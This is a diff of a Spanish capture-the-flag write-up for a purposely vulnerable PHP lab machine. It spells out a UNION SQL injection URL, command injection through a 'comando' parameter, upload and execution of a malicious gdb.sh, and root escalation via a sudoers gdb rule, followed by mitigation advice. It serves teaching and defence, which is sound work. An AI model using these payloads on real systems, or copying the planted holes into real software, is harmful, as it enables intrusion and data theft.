@@ -10,93 +10,163 @@ chmod +x automatizado.sh
 ./automatizado.sh
 
 
-### WriteUp para la solución del sistema vulnerable y explotación de RCE
+Aquí tienes el write-up actualizado con detalles sobre la configuración inicial del entorno y el proceso de explotación:
 
-#### Descripción general del sistema
+---
 
-Este trabajo consiste en la creación de un sistema web vulnerable basado en PHP, con un fallo de seguridad que permite ejecutar código remoto (RCE) en el servidor web, en este caso bajo el usuario `www-data`, que es el mismo usuario que ejecuta el servicio Apache. Este sistema tiene una serie de fallos concatenados que permiten la explotación del sistema para obtener una shell con privilegios elevados. Además, el sistema está configurado para almacenar dos flags: una en `/home/www-data/user.txt` (flag de usuario) y otra en `/root/root.txt` (flag de root).
+## **Write-up: Explotación de Sistema Vulnerable con RCE y Elevación de Privilegios usando GDB**
 
-#### Objetivos del trabajo
+### **Descripción del Sistema**
+Este sistema web vulnerable, desarrollado en PHP, tiene un fallo de seguridad que permite la ejecución remota de código (RCE). El sistema utiliza Apache como servidor web y se ejecuta bajo el usuario `www-data`. Este fallo permite a un atacante con acceso a la aplicación web escalar privilegios y acceder a dos *flags* escondidas en:
 
-1. **Vulnerabilidad Web (RCE)**:
-   Se crea un sistema web vulnerable con PHP, donde se permite la ejecución de código malicioso a través de la concatenación de varios fallos de seguridad, como un fallo en el manejo de entradas no sanitizadas o inyecciones de comandos. 
-   
-2. **Elevación de Privilegios**:
-   Se ha utilizado para la elevación de privilegios:
-   - **gtfobins**: Se proporciona una configuración que explota una vulnerabilidad de una herramienta estándar (por ejemplo, un binario como `python`, `gcc`, etc.) para elevar los privilegios de `www-data` a root.
+1. **Flag de usuario**: `/home/www-data/user.txt`
+2. **Flag de root**: `/root/root.txt`
 
-3. **Generación y almacenamiento de flags**:
-   Las flags se generan aleatoriamente y se almacenan en los archivos `/home/www-data/user.txt` y `/root/root.txt`. Estos archivos contienen las flags que se deben capturar una vez que se exploten las vulnerabilidades.
+El exploit aprovecha inyecciones SQL, subida de archivos maliciosos y escalación de privilegios usando **gtfobins** con `gdb`.
 
-#### Paso 1: Instalación del sistema vulnerable
+---
 
-El sistema está configurado para que se ejecute automáticamente en el arranque. Se utilizan los siguientes componentes:
+## **1. Configuración del Sistema Vulnerable**
 
-1. **Apache2 y PHP**: El servidor Apache se instala y configura para que sirva el sistema web. El script `putFlags.sh` configura Apache para que se ejecute en el usuario `www-data` y genera las flags de usuario y root.
+### **Archivos Utilizados**
+1. **`setup_ova.sh`**:
+   Este script configura el entorno vulnerable, automatizando la instalación de software y la creación de vulnerabilidades necesarias para la explotación.
 
-2. **Vulnerabilidades en PHP**:
-   El sistema web se encuentra vulnerable a inyecciones SQL y ejecución de comandos. El primer paso consiste en acceder a la URL que contiene un fallo de inyección SQL para extraer las credenciales de los usuarios del sistema.
+   #### **Proceso de Configuración Automatizada**
+   El script realiza las siguientes acciones clave:
+   - **Instalación de Apache y PHP**: Configura el servidor web Apache y el intérprete PHP, necesarios para ejecutar la aplicación web.
+   - **Configuración de MySQL**:
+     - Crea la base de datos `ssi`.
+     - Añade múltiples tablas relacionadas con usuarios, administradores, imágenes y eventos.
+     - Inserta datos predeterminados, incluyendo un administrador inicial con credenciales almacenadas directamente en la base de datos.
+   - **Despliegue de la Aplicación**:
+     - Extrae un archivo ZIP (`final.zip`) con los archivos web y los despliega en `/var/www/html/web`.
+     - Configura permisos para asegurar que el servidor Apache (`www-data`) pueda leer y ejecutar los archivos.
+   - **Configuración de GDB para Escalación de Privilegios**:
+     - Ajusta los permisos de `gdb` mediante el archivo `sudoers`, permitiendo que el usuario `www-data` ejecute este binario como root sin contraseña.
 
-#### Paso 2: Explotación de la vulnerabilidad (RCE)
-
-1. **Explotación de Inyección SQL**:
-2. 
-   En el script `automatizado.sh`, se realiza una solicitud HTTP con una inyección SQL en el parámetro `rover_id`:
+   #### **Instrucciones de Uso**:
+   Ejecutar el script como root:
    ```bash
-   fetch_url="http://localhost/web/final/ulio-html/listadoFotosRovers.php?rover_id=%27e%27%20UNION%20SELECT%20fa.contrasena,%20fa.gmail,%201,%202,%203%20FROM%20final_usuarios%20fa,%20final_administradores%20f%20WHERE%20f.usuario_id%20=%20fa.id"
-   ```
-   La inyección SQL utiliza `UNION SELECT` para combinar las tablas `final_usuarios` y `final_administradores` y extraer las contraseñas (`fa.contrasena`) y los correos electrónicos (`fa.gmail`) de los usuarios. Esta información se extrae utilizando `jq` para manejar la respuesta JSON y extraer los valores de las credenciales.
-
-   En este escenario, la necesidad de obtener las credenciales de administrador se debe a que, aunque el sistema permite que los usuarios normales se registren y accedan a la página, solo los administradores tienen privilegios especiales, como la capacidad de subir archivos.
-
-4. **Login de administrador**:
-   Los datos obtenidos de la inyección se usan para realizar un login automático con `curl`, enviando las credenciales extraídas del ataque:
-   ```bash
-   curl -X POST \
-        -d "email=$rover_id" \
-        -d "contrasena=$photo_id" \
-        -d "es_administrador=on" \
-        -c cookies.txt \
-        "$login_url"
-   ```
-   Esto permite al atacante obtener acceso como administrador en la web.
-
-5. **Subida de archivo malicioso**:
-   Una vez autenticado, el atacante sube un archivo malicioso (`gdb.sh`) al servidor mediante una solicitud POST:
-   ```bash
-   curl -X POST -F "profile_picture=@gdb.sh" http://localhost/web/final/dashmin/upload.php
-   ```
-   Este archivo contiene un script que intentará ejecutar comandos en el servidor, probablemente con la intención de obtener una shell.
-
-6. **Ejecución de comando**:
-   El script luego realiza una llamada a la URL que ejecuta comandos en el servidor (`files_url_root`) para ejecutar el archivo malicioso subido. El comando intenta cambiar permisos del archivo `gdb.sh` para hacerlo ejecutable y luego lo ejecuta:
-   ```bash
-   files_url_root="http://localhost/web/final/dashmin/list_uploads.php?comando=ls%20uploads%3B%20cd%20uploads;chmod%20744%20gdb.sh;./gdb.sh"
+   chmod +x setup_ova.sh
+   ./setup_ova.sh
    ```
 
-#### Paso 3: Elevación de privilegios
+2. **`gdb.sh`**:
+   Script malicioso utilizado en la explotación. Este archivo aprovecha `gdb` para leer archivos protegidos.
 
-1. **Elevación usando gtfobins**:
-   Alternativamente, se puede usar una herramienta como `gtfobins` para explotar una vulnerabilidad en un binario del sistema que permita a `www-data` ejecutar comandos como root. Esto depende de la configuración del sistema y de los permisos del binario.
+---
 
-#### Paso 4: Captura de las flags
+## **2. Explotación**
 
-Una vez que se obtiene acceso con privilegios elevados (por una vulnerabilidad gtfobins), el atacante puede leer las flags desde los archivos `/home/www-data/user.txt` y `/root/root.txt`. Esto se realiza mediante la ejecución de comandos como `cat` o cualquier otro método para acceder a esos archivos.
+### **Paso 1: Inyección SQL**
+La vulnerabilidad en `rover_id` permite inyección SQL para extraer credenciales. Por ejemplo:
+```bash
+http://localhost/web/final/ulio-html/listadoFotosRovers.php?rover_id=' UNION SELECT 1, 2, contrasena, gmail, 5 FROM final_usuarios--
+```
 
-- **Flag de usuario**: Se encuentra en `/home/www-data/user.txt`.
-- **Flag de root**: Se encuentra en `/root/root.txt`.
+#### **Objetivo**:
+Extraer las credenciales del administrador, incluyendo:
+- **Correo electrónico (`gmail`)**: Para el login.
+- **Contraseña (`contrasena`)**: En texto plano.
 
-#### Paso 5: Solución a la vulnerabilidad
+#### **Automatización**:
+El script `automatizado.sh` realiza esta extracción utilizando `curl` y formatea la salida con `jq`.
 
-Para solucionar las vulnerabilidades, se deben tomar varias medidas, como:
+---
 
-1. **Sanitización de entradas**: El sistema debe validar y sanitizar todas las entradas de los usuarios para prevenir inyecciones SQL y de comandos.
-2. **Configuración de permisos**: Se deben revisar y ajustar los permisos de los binarios críticos y de los archivos, para que no sea posible la ejecución de comandos arbitrarios por parte del usuario `www-data`.
-3. **Desactivar funcionalidades inseguras**: Desactivar funciones de PHP o cualquier otra funcionalidad que permita la ejecución de código arbitrario.
+### **Paso 2: Acceso como Administrador**
+Con las credenciales obtenidas, autenticarse en el sistema:
+```bash
+curl -X POST \
+     -d "email=admin@gmail.com" \
+     -d "contrasena=admin123" \
+     -d "es_administrador=on" \
+     -c cookies.txt \
+     "http://localhost/web/final/dashmin/login.php"
+```
 
-#### Conclusión
+Esto almacena las cookies de sesión en `cookies.txt`, lo que permite acciones autenticadas.
 
-Este trabajo muestra cómo un sistema web vulnerable puede ser explotado utilizando inyecciones de SQL, subida de archivos maliciosos y técnicas de escalada de privilegios, como el uso de vulnerabilidades de buffer overflow o configuraciones inseguras de binarios. La explotación de estas vulnerabilidades permite obtener acceso completo al sistema, incluyendo la obtención de las flags de usuario y root.
+---
 
-Este tipo de ejercicios es clave para aprender sobre la seguridad informática, ya que permite identificar y remediar vulnerabilidades comunes en aplicaciones web y sistemas.
+### **Paso 3: Subida de Archivo Malicioso**
+Como administrador, la funcionalidad de subida de imágenes permite cargar un script malicioso (`gdb.sh`):
+```bash
+curl -X POST \
+     -F "profile_picture=@gdb.sh" \
+     "http://localhost/web/final/dashmin/upload.php"
+```
 
+El archivo se guarda en el directorio `uploads/` del servidor.
+
+---
+
+### **Paso 4: Ejecución del Script Malicioso**
+Usando otra vulnerabilidad en el servidor (RCE), ejecutamos `gdb.sh`:
+```bash
+curl -s -b cookies.txt \
+"http://localhost/web/final/dashmin/list_uploads.php?comando=chmod%20744%20uploads/gdb.sh;./uploads/gdb.sh"
+```
+
+Este comando:
+1. Cambia permisos del script a ejecutables.
+2. Lo ejecuta, escalando privilegios a root.
+
+---
+
+### **Paso 5: Captura de las Flags**
+1. **Flag de Usuario**:
+   El script accede al archivo `/home/www-data/user.txt`:
+   ```bash
+   curl -s -b cookies.txt \
+   "http://localhost/web/final/dashmin/list_uploads.php?comando=cat%20/home/www-data/user.txt"
+   ```
+
+2. **Flag de Root**:
+   Con `gdb`, se lee `/root/root.txt`:
+   ```bash
+   ./uploads/gdb.sh
+   ```
+
+El contenido de ambas *flags* se muestra en la salida.
+
+---
+
+## **3. Mitigación**
+
+### **Vulnerabilidades Identificadas**
+1. **Inyección SQL**:
+   - El parámetro `rover_id` no sanitiza entradas.
+2. **Subida de Archivos Maliciosos**:
+   - No hay validación de extensiones ni restricciones de tipo MIME.
+3. **Escalación de Privilegios**:
+   - El binario `gdb` tiene permisos inseguros en el archivo `sudoers`.
+
+---
+
+### **Medidas de Seguridad**
+1. **Sanitización de Entradas**:
+   - Usar consultas SQL preparadas.
+   - Validar entradas para evitar comandos maliciosos.
+
+2. **Control de Subidas de Archivos**:
+   - Limitar las extensiones permitidas (`.jpg`, `.png`).
+   - Subir archivos a directorios con permisos `noexec`.
+
+3. **Configuración Segura de Permisos**:
+   - Revisar los binarios con permisos elevados (`gdb`) y eliminar configuraciones inseguras en `sudoers`.
+
+4. **Deshabilitar Funciones Inseguras en PHP**:
+   - Modificar `php.ini` para restringir funciones como `exec`, `shell_exec`:
+     ```
+     disable_functions = exec, system, passthru
+     ```
+
+5. **Principio de Privilegios Mínimos**:
+   - Ejecutar el servidor web con permisos limitados y aislarlo en un entorno de contenedor o jaula (`chroot`).
+
+---
+
+## **Conclusión**
+Este escenario ilustra cómo una serie de vulnerabilidades, combinadas, pueden comprometer un sistema web. Desde inyección SQL hasta escalación de privilegios, es fundamental identificar y mitigar estos riesgos para proteger aplicaciones web contra ataques avanzados.
